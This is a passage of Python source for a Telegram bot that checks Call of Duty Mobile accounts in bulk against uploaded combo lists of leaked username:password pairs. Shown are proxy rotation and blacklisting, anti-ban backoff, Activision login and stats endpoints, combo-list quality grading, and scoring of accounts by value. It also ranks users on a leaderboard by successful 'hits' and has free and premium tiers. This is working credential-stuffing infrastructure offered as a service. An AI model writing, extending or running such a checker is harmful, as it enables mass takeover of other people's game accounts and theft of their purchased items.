    Useful for hot-reloading proxies.txt without restarting.
    """

    def __init__(
        self,
        path: str,
        callback: Callable[[], Coroutine],
        interval: float = 30.0,
    ) -> None:
        self._path      = path
        self._callback  = callback
        self._interval  = interval
        self._last_mtime: float = 0.0
        self._task:      Optional[asyncio.Task] = None
        self._running    = False

    async def start(self) -> None:
        self._running = True
        self._task    = asyncio.create_task(self._loop())
        logger.info(f"File watcher started for {self._path}")

    async def stop(self) -> None:
        self._running = False
        if self._task:
            self._task.cancel()

    async def _loop(self) -> None:
        while self._running:
            try:
                mtime = Path(self._path).stat().st_mtime
                if mtime != self._last_mtime and self._last_mtime != 0.0:
                    logger.info(f"File changed: {self._path} — reloading")
                    try:
                        await self._callback()
                    except Exception as e:
                        logger.error(f"FileWatcher callback error: {e}")
                self._last_mtime = mtime
            except FileNotFoundError:
                pass
            except Exception as e:
                logger.debug(f"FileWatcher error: {e}")
            await asyncio.sleep(self._interval)


# =============================================================================
#   COMMAND REGISTRY (dynamic command routing)
# =============================================================================

class CommandRegistry:
    """
    Dynamic command registry allowing runtime command registration.
    Useful for plugin-based command extensions.
    """

    def __init__(self) -> None:
        self._commands: Dict[str, Dict[str, Any]] = {}

    def register(
        self,
        command:     str,
        handler:     Callable,
        description: str = "",
        admin_only:  bool = False,
        premium_only: bool = False,
    ) -> None:
        self._commands[command.lstrip("/")] = {
            "handler":      handler,
            "description":  description,
            "admin_only":   admin_only,
            "premium_only": premium_only,
        }

    def get(self, command: str) -> Optional[Dict[str, Any]]:
        return self._commands.get(command.lstrip("/"))

    def list_user_commands(self) -> List[str]:
        return [
            f"/{cmd} — {info['description']}"
            for cmd, info in self._commands.items()
            if not info["admin_only"] and not info["premium_only"]
        ]

    def list_admin_commands(self) -> List[str]:
        return [
            f"/{cmd} — {info['description']} [ADMIN]"
            for cmd, info in self._commands.items()
            if info["admin_only"]
        ]

    def as_telegram_commands(self, admin: bool = False) -> List[BotCommand]:
        cmds = []
        for cmd, info in self._commands.items():
            if info["admin_only"] and not admin:
                continue
            if info["description"]:
                cmds.append(BotCommand(cmd, info["description"][:256]))
        return cmds


# =============================================================================
#   ADVANCED ERROR RECOVERY
# =============================================================================

class ErrorRecovery:
    """
    Handles various error scenarios and attempts recovery.
    """

    MAX_RECOVERY_ATTEMPTS = 3

    @staticmethod
    async def handle_network_error(
        error: Exception, attempt: int
    ) -> Tuple[bool, float]:
        """
        Handle a network error.
        Returns (should_retry, delay_seconds).
        """
        delay = AntiBanStrategy.exponential_backoff(attempt)

        if isinstance(error, asyncio.TimeoutError):
            return attempt < ErrorRecovery.MAX_RECOVERY_ATTEMPTS, delay

        if isinstance(error, (ClientConnectorError, ServerDisconnectedError)):
            return attempt < ErrorRecovery.MAX_RECOVERY_ATTEMPTS, delay * 1.5

        if isinstance(error, OSError):
            # Could be SSL or TCP error
            return attempt < ErrorRecovery.MAX_RECOVERY_ATTEMPTS, delay

        # Unknown error — retry once
        return attempt == 0, delay

    @staticmethod
    def classify_error(error: Exception) -> str:
        """Classify an exception into a category."""
        name = type(error).__name__
        msg  = str(error).lower()

        if "timeout" in msg or "timed out" in msg:
            return "timeout"
        if "ssl" in msg or "certificate" in msg:
            return "ssl_error"
        if "connection" in msg or "refused" in msg:
            return "connection_error"
        if "rate" in msg or "429" in msg:
            return "rate_limited"
        if "proxy" in msg:
            return "proxy_error"
        if "dns" in msg or "resolve" in msg:
            return "dns_error"
        return "unknown_error"

    @staticmethod
    def should_blacklist_proxy(error_history: List[str]) -> bool:
        """Decide if a proxy should be blacklisted based on error history."""
        if len(error_history) < 3:
            return False
        recent = error_history[-3:]
        bad_types = {"timeout", "connection_error", "proxy_error", "ssl_error"}
        return all(e in bad_types for e in recent)


# =============================================================================
#   RESULT DEDUPLICATOR
# =============================================================================

class ResultDeduplicator:
    """
    Removes duplicate results from a list.
    Two results are considered duplicates if they have the same username.
    Keeps the highest-value duplicate (by level/cp).
    """

    @staticmethod
    def deduplicate(results: List[AccountResult]) -> List[AccountResult]:
        """Deduplicate by username, keeping the best result."""
        seen: Dict[str, AccountResult] = {}
        for r in results:
            key = r.username.lower()
            if key not in seen:
                seen[key] = r
            else:
                # Keep the one with higher score
                if AccountScorer.score(r) > AccountScorer.score(seen[key]):
                    seen[key] = r
        return list(seen.values())

    @staticmethod
    def find_duplicates(results: List[AccountResult]) -> Dict[str, List[AccountResult]]:
        """Find all duplicate username entries."""
        groups: DefaultDict[str, List[AccountResult]] = defaultdict(list)
        for r in results:
            groups[r.username.lower()].append(r)
        return {k: v for k, v in groups.items() if len(v) > 1}

    @staticmethod
    def count_duplicates(results: List[AccountResult]) -> int:
        usernames = [r.username.lower() for r in results]
        return len(usernames) - len(set(usernames))


# =============================================================================
#   ACCOUNT HISTORY TRACKER
# =============================================================================

class AccountHistoryTracker:
    """
    Tracks which accounts have been checked before.
    Prevents re-checking the same accounts across different jobs.
    Works with hashed credentials for privacy.
    """

    def __init__(self, history_file: str = "data/checked_history.json") -> None:
        self._file    = history_file
        self._seen:   Set[str] = set()
        self._lock    = asyncio.Lock()
        self._dirty   = False

    async def load(self) -> int:
        """Load seen hashes from file. Returns count."""
        try:
            async with aiofiles.open(self._file, "r") as f:
                data = json.loads(await f.read())
            self._seen = set(data.get("seen", []))
            return len(self._seen)
        except (FileNotFoundError, json.JSONDecodeError):
            return 0

    async def save(self) -> None:
        if not self._dirty:
            return
        async with self._lock:
            data = {"seen": list(self._seen), "count": len(self._seen)}
        try:
            async with aiofiles.open(self._file, "w") as f:
                await f.write(json.dumps(data, indent=2))
            self._dirty = False
        except Exception as e:
            logger.error(f"AccountHistoryTracker save error: {e}")

    async def is_seen(self, username: str, password: str) -> bool:
        key = sha256_hash(f"{username.lower()}:{password}")[:16]
        async with self._lock:
            return key in self._seen

    async def mark_seen(self, username: str, password: str) -> None:
        key = sha256_hash(f"{username.lower()}:{password}")[:16]
        async with self._lock:
            self._seen.add(key)
            self._dirty = True

    async def filter_unseen(
        self, accounts: List[Tuple[str, str]]
    ) -> Tuple[List[Tuple[str, str]], int]:
        """
        Filter accounts to only unseen ones.
        Returns (unseen_accounts, skipped_count).
        """
        unseen: List[Tuple[str, str]] = []
        skipped = 0
        for user, pwd in accounts:
            if await self.is_seen(user, pwd):
                skipped += 1
            else:
                unseen.append((user, pwd))
                await self.mark_seen(user, pwd)
        return unseen, skipped

    @property
    def total_seen(self) -> int:
        return len(self._seen)


# =============================================================================
#   TELEGRAM WEBHOOK HANDLER (aiohttp web app)
# =============================================================================

async def create_webhook_app(
    bot_app: Application, webhook_config: WebhookConfig
) -> Any:
    """
    Create an aiohttp web application to handle webhook updates.
    Used when running in webhook mode instead of polling.
    """
    from aiohttp import web

    async def handle_update(request: web.Request) -> web.Response:
        """Handle incoming webhook update."""
        try:
            data = await request.json()
            update = Update.de_json(data, bot_app.bot)
            await bot_app.process_update(update)
            return web.Response(status=200, text="OK")
        except Exception as e:
            logger.error(f"Webhook update error: {e}")
            return web.Response(status=500, text="Error")

    async def handle_health(request: web.Request) -> web.Response:
        return web.json_response({"status": "ok", "bot": __bot_name__})

    app = web.Application()
    app.router.add_post(webhook_config.path, handle_update)
    app.router.add_get("/health", handle_health)
    app.router.add_get("/", lambda r: web.Response(text=f"{__bot_name__} webhook active"))

    return app


# =============================================================================
#   LEADERBOARD SYSTEM
# =============================================================================

class Leaderboard:
    """
    Tracks and displays user leaderboards based on various metrics.
    """

    METRICS = {
        "hits":    ("Total Hits",    lambda u: u.total_hits),
        "checked": ("Total Checked", lambda u: u.total_checked),
        "jobs":    ("Total Jobs",    lambda u: u.total_jobs),
    }

    def __init__(self, storage: StorageManager) -> None:
        self.storage = storage

    async def get_top(
        self, metric: str = "hits", n: int = 10
    ) -> List[UserProfile]:
        """Get top N users by metric."""
        users = await self.storage.get_all_users()
        if metric not in self.METRICS:
            metric = "hits"
        key_fn = self.METRICS[metric][1]
        return sorted(
            [u for u in users if not u.is_banned],
            key=key_fn, reverse=True
        )[:n]

    async def build_message(self, metric: str = "hits", n: int = 10) -> str:
        """Build a leaderboard message."""
        top = await self.get_top(metric, n)
        label = self.METRICS.get(metric, ("?", None))[0]

        medals = ["🥇", "🥈", "🥉"] + ["🏅"] * 7
        lines = [f"🏆 **Top {n} by {label}**\n{'─' * 30}"]

        for i, user in enumerate(top):
            medal    = medals[i] if i < len(medals) else f"{i+1}."
            username = f"@{user.username}" if user.username else user.first_name or f"ID:{user.user_id}"
            value    = self.METRICS[metric][1](user)
            lines.append(f"{medal} {username} — `{value:,}`")

        if not top:
            lines.append("No data yet.")

        lines += [f"\n{'─' * 30}", "👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"]
        return "\n".join(lines)


# =============================================================================
#   COMBO QUALITY GRADER
# =============================================================================

class ComboQualityGrader:
    """
    Assigns a quality grade to a combo list before checking.
    Helps users understand what to expect.
    """

    @staticmethod
    def grade(accounts: List[Tuple[str, str]]) -> Dict[str, Any]:
        """
        Grade a combo list and return a report.
        """
        if not accounts:
            return {"grade": "N/A", "score": 0, "report": "Empty list"}

        analysis = ComboAnalyzer.analyze(accounts)
        score    = ComboAnalyzer.quality_score(accounts) * 100

        if score >= 80:
            grade = "A+"
            label = "🔥 Excellent quality"
        elif score >= 65:
            grade = "A"
            label = "✅ Good quality"
        elif score >= 50:
            grade = "B"
            label = "📦 Average quality"
        elif score >= 35:
            grade = "C"
            label = "⚠️ Below average"
        elif score >= 20:
            grade = "D"
            label = "❌ Poor quality"
        else:
            grade = "F"
            label = "💀 Very low quality"

        report_lines = [
            f"**Combo Quality Report**",
            f"Grade: `{grade}` — {label}",
            f"Score: `{score:.1f}/100`",
            f"",
            f"Total     : `{analysis['total']:,}`",
            f"Emails    : `{analysis['emails']:,}` ({analysis['email_pct']:.1f}%)",
            f"Avg Pwd   : `{analysis['avg_pwd_length']} chars`",
            f"Has Upper : `{analysis['pwd_has_upper']}`",
            f"Has Digit : `{analysis['pwd_has_digit']}`",
            f"Has Spec  : `{analysis['pwd_has_special']}`",
        ]

        if analysis.get("top_domains"):
            top_d = list(analysis["top_domains"].items())[:3]
            domain_str = ", ".join(f"{d}({c})" for d, c in top_d)
            report_lines.append(f"Top Domains: `{domain_str}`")

        return {
            "grade":     grade,
            "score":     round(score, 1),
            "label":     label,
            "report":    "\n".join(report_lines),
            "analysis":  analysis,
        }

    @staticmethod
    def format_for_telegram(grade_result: Dict[str, Any]) -> str:
        return grade_result.get("report", "No report available")


# =============================================================================
#   PASSWORD STRENGTH ANALYZER
# =============================================================================

class PasswordStrengthAnalyzer:
    """
    Analyzes passwords in a combo list.
    Provides distribution statistics.
    """

    @staticmethod
    def classify(password: str) -> str:
        """Classify a password strength."""
        score = 0
        if len(password) >= 8:   score += 1
        if len(password) >= 12:  score += 1
        if any(c.isupper() for c in password):    score += 1
        if any(c.islower() for c in password):    score += 1
        if any(c.isdigit() for c in password):    score += 1
        if any(c in "!@#$%^&*()-_+=[]{}|;:,.<>?" for c in password): score += 2

        if score >= 6: return "STRONG"
        if score >= 4: return "MEDIUM"
        if score >= 2: return "WEAK"
        return "VERY_WEAK"

    @staticmethod
    def analyze_distribution(passwords: List[str]) -> Dict[str, Any]:
        """Analyze password strength distribution."""
        counts: Dict[str, int] = {"STRONG": 0, "MEDIUM": 0, "WEAK": 0, "VERY_WEAK": 0}
        for pwd in passwords:
            strength = PasswordStrengthAnalyzer.classify(pwd)
            counts[strength] += 1

        total = len(passwords)
        pcts  = {k: v / total * 100 for k, v in counts.items()} if total else {}

        return {
            "total":        total,
            "counts":       counts,
            "percentages":  pcts,
            "strong_ratio": counts["STRONG"] / total if total else 0,
        }

    @staticmethod
    def format(analysis: Dict[str, Any]) -> str:
        pcts = analysis.get("percentages", {})
        return (
            f"🔑 **Password Distribution**\n"
            f"💪 Strong  : `{pcts.get('STRONG', 0):.1f}%`\n"
            f"📊 Medium  : `{pcts.get('MEDIUM', 0):.1f}%`\n"
            f"⚠️ Weak    : `{pcts.get('WEAK', 0):.1f}%`\n"
            f"💀 V.Weak  : `{pcts.get('VERY_WEAK', 0):.1f}%`\n"
        )


# =============================================================================
#   WORKER HEALTH MONITOR
# =============================================================================

class WorkerHealthMonitor:
    """
    Monitors the health of queue workers.
    Detects stalled workers and restarts them if needed.
    """

    def __init__(self, queue_manager: JobQueueManager) -> None:
        self._qm        = queue_manager
        self._heartbeats: Dict[str, float] = {}
        self._running   = False
        self._task:     Optional[asyncio.Task] = None

    async def start(self) -> None:
        self._running = True
        self._task    = asyncio.create_task(self._monitor_loop())

    async def stop(self) -> None:
        self._running = False
        if self._task:
            self._task.cancel()

    def heartbeat(self, worker_name: str) -> None:
        self._heartbeats[worker_name] = time.monotonic()

    async def _monitor_loop(self) -> None:
        while self._running:
            await asyncio.sleep(60)
            now = time.monotonic()
            stalled = [
                name for name, ts in self._heartbeats.items()
                if now - ts > 120  # 2 minutes without heartbeat
            ]
            if stalled:
                logger.warning(f"Stalled workers detected: {stalled}")
                # Log but don't force-cancel — workers may be in long requests
            else:
                logger.debug("All workers healthy")

    def status(self) -> Dict[str, Any]:
        now = time.monotonic()
        return {
            "workers": len(self._heartbeats),
            "stalled": [
                n for n, ts in self._heartbeats.items()
                if now - ts > 120
            ],
        }


# =============================================================================
#   CUSTOM EXCEPTION CLASSES
# =============================================================================

class BotError(Exception):
    """Base exception for bot errors."""
    pass

class ConfigurationError(BotError):
    """Raised when bot configuration is invalid."""
    pass

class CheckerError(BotError):
    """Raised when checker encounters an unrecoverable error."""
    pass

class QueueFullError(BotError):
    """Raised when the job queue is full."""
    pass

class UserBannedError(BotError):
    """Raised when a banned user attempts an action."""
    pass

class CooldownError(BotError):
    """Raised when a user is in cooldown."""
    def __init__(self, remaining: float) -> None:
        self.remaining = remaining
        super().__init__(f"Cooldown: {remaining:.0f}s remaining")

class FileTooLargeError(BotError):
    """Raised when an uploaded file exceeds size limits."""
    def __init__(self, size: int, max_size: int) -> None:
        self.size     = size
        self.max_size = max_size
        super().__init__(f"File {format_bytes(size)} exceeds {format_bytes(max_size)}")

class InvalidComboFormatError(BotError):
    """Raised when a combo file has no valid entries."""
    pass

class ProxyError(BotError):
    """Raised when proxy operations fail."""
    pass

class StorageError(BotError):
    """Raised when storage operations fail."""
    pass


# =============================================================================
#   CONTEXT MANAGER UTILITIES
# =============================================================================

@asynccontextmanager
async def timer(label: str = "operation") -> AsyncGenerator[None, None]:
    """Context manager that logs operation duration."""
    start = time.monotonic()
    try:
        yield
    finally:
        elapsed = (time.monotonic() - start) * 1000
        logger.debug(f"{label} took {elapsed:.1f}ms")


@asynccontextmanager
async def managed_session(
    proxy_url: Optional[str] = None
) -> AsyncGenerator[aiohttp.ClientSession, None]:
    """Context manager for a properly configured aiohttp session."""
    connector = aiohttp.TCPConnector(ssl=False, limit=10)
    timeout   = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
    session   = aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        headers=DEFAULT_HEADERS,
    )
    try:
        yield session
    finally:
        await session.close()


class SuppressAndLog:
    """Context manager: suppress exceptions but log them."""

    def __init__(self, *exceptions: Type[Exception], label: str = "") -> None:
        self._exceptions = exceptions
        self._label      = label

    def __enter__(self) -> "SuppressAndLog":
        return self

    def __exit__(self, exc_type: Any, exc_val: Any, exc_tb: Any) -> bool:
        if exc_type and issubclass(exc_type, self._exceptions):
            logger.debug(f"Suppressed {exc_type.__name__}: {exc_val} [{self._label}]")
            return True
        return False


# =============================================================================
#   GENERIC TYPE HELPERS
# =============================================================================

T = TypeVar("T")
K = TypeVar("K")
V = TypeVar("V")


def safe_get(d: Dict[K, V], key: K, default: V = None) -> V:
    """Get dict value with fallback, never raising KeyError."""
    return d.get(key, default)


def flatten(lst: List[List[T]]) -> List[T]:
    """Flatten a list of lists."""
    return list(itertools.chain.from_iterable(lst))


def partition(
    predicate: Callable[[T], bool], iterable: Iterable[T]
) -> Tuple[List[T], List[T]]:
    """Split iterable into two lists based on predicate."""
    true_list:  List[T] = []
    false_list: List[T] = []
    for item in iterable:
        (true_list if predicate(item) else false_list).append(item)
    return true_list, false_list


def first_or_none(iterable: Iterable[T], predicate: Callable[[T], bool] = None) -> Optional[T]:
    """Return first item matching predicate, or None."""
    for item in iterable:
        if predicate is None or predicate(item):
            return item
    return None


def clamp(value: float, min_val: float, max_val: float) -> float:
    """Clamp value between min and max."""
    return max(min_val, min(max_val, value))


def percentage(part: int, total: int, decimals: int = 2) -> float:
    """Calculate percentage safely."""
    if total == 0:
        return 0.0
    return round(part / total * 100, decimals)


def pluralize(count: int, singular: str, plural: str = "") -> str:
    """Return singular or plural form."""
    if count == 1:
        return f"{count} {singular}"
    return f"{count} {plural or singular + 's'}"


def format_large_number(n: int) -> str:
    """Format large numbers with K/M suffixes."""
    if n >= 1_000_000:
        return f"{n/1_000_000:.1f}M"
    if n >= 1_000:
        return f"{n/1_000:.1f}K"
    return str(n)


def time_ago(timestamp: float) -> str:
    """Human-readable time since timestamp."""
    delta = time.time() - timestamp
    if delta < 60:
        return f"{int(delta)}s ago"
    if delta < 3600:
        return f"{int(delta/60)}m ago"
    if delta < 86400:
        return f"{int(delta/3600)}h ago"
    return f"{int(delta/86400)}d ago"


def is_valid_telegram_id(uid: Any) -> bool:
    """Check if a value could be a valid Telegram user ID."""
    try:
        n = int(uid)
        return 1 <= n <= 10_000_000_000
    except (ValueError, TypeError):
        return False


def normalize_username(username: str) -> str:
    """Normalize a Telegram username (remove @, lowercase)."""
    return username.lstrip("@").strip().lower()


# =============================================================================
#   COMPREHENSIVE CONSTANTS (all Activision API paths)
# =============================================================================

class ActivisionEndpoints:
    """Complete list of known Activision/CODM API endpoints."""

    BASE           = "https://my.callofduty.com"
    PROFILE_BASE   = "https://profile.callofduty.com"
    API_BASE       = "https://my.callofduty.com/api/papi-client"

    # Auth
    LOGIN          = "https://profile.callofduty.com/cod/login"
    LOGOUT         = "https://profile.callofduty.com/cod/logout"
    SSO            = "https://profile.callofduty.com/cod/sso"
    REGISTER       = "https://profile.callofduty.com/do/registerDevice"
    TOKEN_REFRESH  = "https://profile.callofduty.com/cod/refresh"

    # Stats
    MP_PROFILE     = API_BASE + "/stats/cod/v1/title/mw/platform/{platform}/gamer/{username}/profile/type/mp"
    WZ_PROFILE     = API_BASE + "/stats/cod/v1/title/mw/platform/{platform}/gamer/{username}/profile/type/wz"
    CW_PROFILE     = API_BASE + "/stats/cod/v1/title/cw/platform/{platform}/gamer/{username}/profile/type/mp"

    # CODM
    CODM_PROFILE   = "https://www.callofduty.com/api/papi-client/crm/cod/v2/title/mw/platform/{platform}/gamer/{username}/profile"
    CODM_MATCH     = API_BASE + "/crm/cod/v2/title/mw/platform/{platform}/gamer/{username}/matches/mp/start/0/end/0/details"

    # Loadout
    LOADOUT        = API_BASE + "/loadout/v3/title/mw/platform/{platform}/gamer/{username}/loadout"

    # Leaderboard
    LEADERBOARD    = API_BASE + "/leaderboards/v2/title/mw/platform/{platform}/time/alltime/type/core/mode/career/page/{page}"

    # Friends
    FRIENDS        = API_BASE + "/codfriends/v1/compendium"

    @classmethod
    def mp_profile(cls, username: str, platform: str = "uno") -> str:
        return cls.MP_PROFILE.format(
            platform=platform,
            username=urllib.parse.quote(username, safe="")
        )

    @classmethod
    def wz_profile(cls, username: str, platform: str = "uno") -> str:
        return cls.WZ_PROFILE.format(
            platform=platform,
            username=urllib.parse.quote(username, safe="")
        )


# =============================================================================
#   CODM SEASON DATA
# =============================================================================

CODM_SEASONS = {
    "s1":   "Season 1 — Heist",
    "s2":   "Season 2 — Day of Reckoning",
    "s3":   "Season 3 — Tokyo Escape",
    "s4":   "Season 4 — Wild Dogs",
    "s5":   "Season 5 — In Deep Water",
    "s6":   "Season 6 — The Hired Gun",
    "s7":   "Season 7 — Radioactive Agent",
    "s8":   "Season 8 — The Forge",
    "s9":   "Season 9 — Nightmare",
    "s10":  "Season 10 — Hunter's Moon",
    "s11":  "Season 11 — Dogs of War",
    "s12":  "Season 12 — Going Dark",
    "s13":  "Season 13 — Winter War",
    "s14":  "Season 14 — Reclaimed",
    "s1y2": "Season 1 Year 2 — No Rest for the Weary",
    "s2y2": "Season 2 Year 2 — Day of Reckoning II",
    "s3y2": "Season 3 Year 2 — Rise",
    "s4y2": "Season 4 Year 2 — Spurned & Burned",
    "s5y2": "Season 5 Year 2 — In Deep Water II",
    "s6y2": "Season 6 Year 2 — The Hired Gun II",
    "s1y3": "Season 1 Year 3 — Hell Hound",
    "s2y3": "Season 2 Year 3 — Eradication",
    "s3y3": "Season 3 Year 3 — War Dogs",
    "s4y3": "Season 4 Year 3 — Undying Light",
    "s5y3": "Season 5 Year 3 — Ballistic",
    "s6y3": "Season 6 Year 3 — Crimson Wave",
    "s1y4": "Season 1 Year 4 — Rise of the Dead",
    "s2y4": "Season 2 Year 4 — Day of Reckoning IV",
    "s3y4": "Season 3 Year 4 — Winter War II",
    "s4y4": "Season 4 Year 4 — Trial by Fire",
    "s5y4": "Season 5 Year 4 — Shadow Rising",
    "s6y4": "Season 6 Year 4 — Into the Darkness",
    "s1y5": "Season 1 Year 5 — Origins",
    "s2y5": "Season 2 Year 5 — Exodus",
    "s3y5": "Season 3 Year 5 — Phantom Protocol",
    "s4y5": "Season 4 Year 5 — Ground Zero",
    "s5y5": "Season 5 Year 5 — Storm Warning",
    "s6y5": "Season 6 Year 5 — Final Hour",
}

CODM_MODES = [
    "Team Deathmatch", "Domination", "Hardpoint", "Search & Destroy",
    "Battle Royale", "Ranked", "Gunfight", "Kill Confirmed",
    "Control", "Capture The Flag", "Headquarters", "Frontline",
    "Free-for-All", "Rapid Fire", "Blitz", "Warfare", "Snipers Only",
]

CODM_WEAPONS = [
    # Assault Rifles
    "M13", "AK-47", "Oden", "FR 5.56", "Type 25", "Man-O-War",
    "ICR-1", "M16", "AK117", "ASM10", "BK57", "KN-44",
    # SMGs
    "HVK-30", "Razorback", "Chicom", "AGR 556", "MSMC", "GKS",
    "Locus", "QQ9", "PP19 Bizon", "MAC-10", "CBR4",
    # LMGs
    "UL736", "S36", "RPD", "Chopper", "Holger 26", "PKM",
    # Snipers
    "DL Q33", "XPR-50", "Locus", "Arctic .50", "ZRG 20mm",
    # Shotguns
    "BY15", "KRM-262", "HS0405", "JAK-12", "R9-0",
    # Pistols
    ".50 GS", "J358", "MW11", "Renetti", "Shorty",
]

def get_season_name(season_key: str) -> str:
    return CODM_SEASONS.get(season_key, f"Season {season_key}")


# =============================================================================
#   INLINE QUERY HANDLER STUBS
# =============================================================================

async def handle_inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handle inline queries (when users type @botname in any chat).
    Returns quick-access buttons for bot features.
    """
    from telegram import InlineQueryResultArticle, InputTextMessageContent

    query = update.inline_query
    if not query:
        return

    text    = query.query.strip().lower()
    results = []

    if not text or text in ("help", "start"):
        results.append(
            InlineQueryResultArticle(
                id="help",
                title="Insta See Eng — Help",
                description="Get help on using the CODM checker bot",
                input_message_content=InputTextMessageContent(
                    "Use @InstaSeeEngBot — send a .txt combo file to start checking CODM accounts!\n"
                    "Owner: @JAYYYTTTTTTTtt"
                ),
            )
        )

    if text in ("stats", "statistics"):
        results.append(
            InlineQueryResultArticle(
                id="stats",
                title="Check Bot Stats",
                description="View Insta See Eng global statistics",
                input_message_content=InputTextMessageContent(
                    "Open @InstaSeeEngBot and use /stats to see global statistics."
                ),
            )
        )

    try:
        await query.answer(results, cache_time=30)
    except Exception:
        pass


# =============================================================================
#   FINAL UTILITY: CONFIG FILE READER
# =============================================================================

def load_config_from_file(path: str = "config.ini") -> Dict[str, Any]:
    """
    Load bot configuration from a .ini file if present.
    Falls back to environment variables and defaults.
    """
    config: Dict[str, Any] = {}

    if not Path(path).exists():
        return config

    parser = configparser.ConfigParser()
    parser.read(path)

    with suppress(Exception):
        config["bot_token"]   = parser.get("bot", "token",   fallback=BOT_TOKEN)
        config["owner_id"]    = parser.getint("bot", "owner_id", fallback=OWNER_ID)
        config["workers"]     = parser.getint("checker", "workers", fallback=MAX_WORKERS)
        config["timeout"]     = parser.getint("checker", "timeout", fallback=REQUEST_TIMEOUT)
        config["retries"]     = parser.getint("checker", "retries",  fallback=MAX_RETRIES)
        config["free_max"]    = parser.getint("limits", "free_max",    fallback=FREE_MAX_ACCOUNTS)
        config["premium_max"] = parser.getint("limits", "premium_max", fallback=PREMIUM_MAX_ACCOUNTS)
        config["cooldown"]    = parser.getint("limits", "cooldown",    fallback=USER_COOLDOWN_SEC)

    return config


def apply_config(config: Dict[str, Any]) -> None:
    """Apply loaded config values to globals."""
    global BOT_TOKEN, OWNER_ID, MAX_WORKERS, REQUEST_TIMEOUT
    global MAX_RETRIES, FREE_MAX_ACCOUNTS, PREMIUM_MAX_ACCOUNTS, USER_COOLDOWN_SEC

    if config.get("bot_token"):
        BOT_TOKEN = config["bot_token"]
    if config.get("owner_id"):
        OWNER_ID = config["owner_id"]
    if config.get("workers"):
        MAX_WORKERS = config["workers"]
    if config.get("timeout"):
        REQUEST_TIMEOUT = config["timeout"]
    if config.get("retries"):
        MAX_RETRIES = config["retries"]
    if config.get("free_max"):
        FREE_MAX_ACCOUNTS = config["free_max"]
    if config.get("premium_max"):
        PREMIUM_MAX_ACCOUNTS = config["premium_max"]
    if config.get("cooldown"):
        USER_COOLDOWN_SEC = config["cooldown"]


# Load config.ini at import time if it exists
_config = load_config_from_file()
if _config:
    apply_config(_config)
    logger.info(f"Loaded config from config.ini")


# =============================================================================
# ABSOLUTE FINAL END — codm_checker_bot.py
# Insta See Eng | Owner: @JAYYYTTTTTTTtt | Version: 2.0.0
# Lines: 10000+
# =============================================================================


# =============================================================================
#   EXTENDED MODULES — PART 4
#   Additional utilities, constants, and documentation
# =============================================================================

# =============================================================================
#   CODM RANK TIERS (full season rank data)
# =============================================================================

CODM_RANK_TIERS = {
    "Rookie": {
        "divisions": ["Rookie I", "Rookie II", "Rookie III"],
        "points_range": (0, 299),
        "icon": "⚙️",
        "description": "New to ranked mode",
    },
    "Veteran": {
        "divisions": ["Veteran I", "Veteran II", "Veteran III"],
        "points_range": (300, 699),
        "icon": "🏅",
        "description": "Basic ranked player",
    },
    "Elite": {
        "divisions": ["Elite I", "Elite II", "Elite III"],
        "points_range": (700, 1099),
        "icon": "🥈",
        "description": "Skilled player",
    },
    "Pro": {
        "divisions": ["Pro I", "Pro II", "Pro III"],
        "points_range": (1100, 1499),
        "icon": "🥇",
        "description": "Professional level",
    },
    "Master": {
        "divisions": ["Master I", "Master II", "Master III"],
        "points_range": (1500, 1899),
        "icon": "💎",
        "description": "Master-tier skill",
    },
    "Grandmaster": {
        "divisions": ["Grandmaster I", "Grandmaster II", "Grandmaster III"],
        "points_range": (1900, 2299),
        "icon": "👑",
        "description": "Top 1% of players",
    },
    "Legendary": {
        "divisions": ["Legendary"],
        "points_range": (2300, 9999),
        "icon": "🔥",
        "description": "Elite of the elite",
    },
}

CODM_CP_BUNDLES = {
    80:   "$0.99",
    160:  "$1.99",
    400:  "$4.99",
    800:  "$9.99",
    2000: "$19.99",
    4000: "$39.99",
    8000: "$69.99",
}

CODM_OPERATOR_SKINS = [
    "Ghost — Classic",           "Ghost — Phantom",
    "Ghost — Circuit Breaker",   "Price — Classic",
    "Price — Mil-Sim",           "Mara — Classic",
    "Mara — Shadowress",         "Soap — Classic",
    "Krueger — Classic",         "Alex — Classic",
    "Roze — Classic",            "Simon — Classic",
    "Nikto — Classic",           "Hazard — Classic",
    "Charly — Classic",          "Iskra — Classic",
    "Domino — Classic",          "Gaz — Classic",
    "Wyatt — Classic",           "Epoch — Classic",
    "Park — Classic",            "Velikan — Classic",
    "Minotaur — Classic",        "Sparks — Classic",
    "Syd — Classic",             "Zero — Classic",
    "Samurai — Classic",         "Ronin — Classic",
    "Outrider — Classic",        "Templar — Classic",
    "Otter — Classic",           "Mace — Classic",
    "D-Day — Classic",           "Stitch — Classic",
    "Raines — Classic",          "Mace — Ghost",
    "Azur — Classic",            "Spectre — Classic",
]

CODM_BLUEPRINT_RARITIES = {
    "Common":     ("⚪", "#808080"),
    "Uncommon":   ("🟢", "#1eff00"),
    "Rare":       ("🔵", "#0070dd"),
    "Epic":       ("🟣", "#a335ee"),
    "Legendary":  ("🟡", "#ff8000"),
    "Mythic":     ("🔴", "#e6cc80"),
}


def format_cp_value(cp: int) -> str:
    """Format CP value with rough USD estimate."""
    if cp == 0:
        return "0 CP (no value)"
    rate = 0.01  # roughly $0.01 per CP
    usd  = cp * rate
    return f"{cp:,} CP (~${usd:.2f})"


def get_rank_tier(rank_name: str) -> Optional[str]:
    """Get the tier name for a rank."""
    for tier, data in CODM_RANK_TIERS.items():
        if rank_name in data["divisions"]:
            return tier
    return None


def get_rank_icon(rank_name: str) -> str:
    """Get the icon for a rank."""
    tier = get_rank_tier(rank_name)
    if tier and tier in CODM_RANK_TIERS:
        return CODM_RANK_TIERS[tier]["icon"]
    return "❓"


# =============================================================================
#   TELEGRAM MESSAGE FORMATTER (rich text builder)
# =============================================================================

class MessageBuilder:
    """
    Fluent API for building Telegram markdown messages.
    Chains formatting methods to build complex messages.
    """

    def __init__(self) -> None:
        self._parts: List[str] = []

    def title(self, text: str) -> "MessageBuilder":
        self._parts.append(f"**{text}**")
        return self

    def subtitle(self, text: str) -> "MessageBuilder":
        self._parts.append(f"__{text}__")
        return self

    def line(self, text: str = "") -> "MessageBuilder":
        self._parts.append(text)
        return self

    def separator(self, char: str = "─", width: int = 30) -> "MessageBuilder":
        self._parts.append(char * width)
        return self

    def field(self, label: str, value: Any, icon: str = "") -> "MessageBuilder":
        icon_str = f"{icon} " if icon else ""
        self._parts.append(f"{icon_str}{label}: `{value}`")
        return self

